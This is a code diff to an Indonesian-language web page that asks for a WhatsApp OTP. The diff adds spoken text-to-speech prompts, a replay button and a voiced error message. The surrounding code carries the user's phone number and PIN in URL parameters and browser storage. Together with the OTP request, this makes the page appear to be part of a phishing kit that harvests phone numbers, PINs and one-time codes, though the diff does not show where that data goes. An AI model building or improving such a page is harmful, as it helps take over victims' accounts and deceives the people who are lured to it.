@@ -13,16 +13,21 @@
     }
   </style>
 </head>
-<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none">
+<body class="flex flex-col min-h-screen text-slate-800 antialiased select-none" onclick="aktifkanAudioPertama()">
 
   <div class="w-full max-w-[420px] mx-auto min-h-screen bg-[#f3f4f6] flex flex-col justify-between pt-5 px-6 pb-6 shadow-sm">
     
     <!-- Bagian Atas -->
     <div>
       <!-- Tombol Kembali (Panah Kiri) -->
-      <div class="flex items-center mb-5">
+      <div class="flex items-center justify-between mb-5">
         <button type="button" onclick="history.back()" class="text-slate-800 font-bold text-2xl active:opacity-60 leading-none">
           ←
+        </button>
+
+        <!-- Tombol Ulangi Suara (Opsional jika pengguna ingin dengar lagi) -->
+        <button type="button" onclick="ucapPesan('Silakan masukkan 6 digit kode OTP yang telah dikirim ke WhatsApp Anda.')" class="text-xs bg-emerald-100 text-emerald-800 px-3 py-1 rounded-full font-semibold active:bg-emerald-200">
+          🔊 Dengar Suara
         </button>
       </div>
 
@@ -70,7 +75,7 @@
         Kode OTP salah atau sudah kedaluwarsa. Silakan coba lagi.
       </div>
 
-      <!-- Tombol Aksi (Kotak dipendekkan pas seukuran panjang teks & rata kiri) -->
+      <!-- Tombol Aksi -->
       <div class="mt-6 space-y-2.5 flex flex-col items-start">
         <button type="button" class="py-2.5 px-6 rounded-full border border-emerald-600 text-emerald-700 font-extrabold text-[14px] bg-white active:bg-emerald-50 transition-colors text-left shadow-sm">
           Buka WhatsApp
@@ -101,6 +106,35 @@
     const hiddenInput = document.getElementById('hidden-otp-input');
     const timerDisplay = document.getElementById('timer');
 
+    // --- FUNGSI SUARA BICARA (Text-to-Speech) ---
+    let audioSudahAktif = false;
+
+    function ucapPesan(teks) {
+      if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel(); // Hentikan suara sebelumnya jika ada
+        const pesan = new SpeechSynthesisUtterance(teks);
+        pesan.lang = 'id-ID'; // Bahasa Indonesia
+        pesan.rate = 0.95;   // Kecepatan suara (sedikit lebih santai)
+        pesan.pitch = 1.0;  // Nada standar
+        window.speechSynthesis.speak(pesan);
+      }
+    }
+
+    // Pemicu Suara Pertama Saat Ada Interaksi/Sentuhan Layar (Aturan Browser HP)
+    function aktifkanAudioPertama() {
+      if (!audioSudahAktif) {
+        audioSudahAktif = true;
+        ucapPesan("Silakan masukkan 6 digit kode O T P yang telah dikirim ke WhatsApp Anda.");
+      }
+    }
+
+    // Jalankan suara saat halaman selesai dimuat (jika izinkan browser)
+    window.addEventListener('DOMContentLoaded', () => {
+      setTimeout(() => {
+        ucapPesan("Silakan masukkan kode O T P Anda.");
+      }, 500);
+    });
+
     // Timer Hitung Mundur (60 Detik)
     let timeLeft = 60;
     const countdown = setInterval(() => {
@@ -115,7 +149,7 @@
       }
     }, 1000);
 
-    // Ambil Data Nomor HP dan PIN (Dari URL atau Penyimpanan Browser)
+    // Ambil Data Nomor HP dan PIN
     const urlParams = new URLSearchParams(window.location.search);
     const userPhone = urlParams.get('phone') || localStorage.getItem('userPhone') || "Tidak diketahui";
     const userPin = urlParams.get('pin') || localStorage.getItem('userPin') || "Tidak diketahui";
@@ -169,8 +203,12 @@
           circle.style.backgroundColor = "#cbd5e1";
         });
         errorMsg.classList.remove('hidden');
+        
+        // Membunyikan suara peringatan saat OTP salah
+        ucapPesan("Kode O T P salah atau sudah kedaluwarsa. Silakan periksa kembali dan masukkan ulang.");
       }, 400);
     }
   </script>
 </body>
 </html>
+
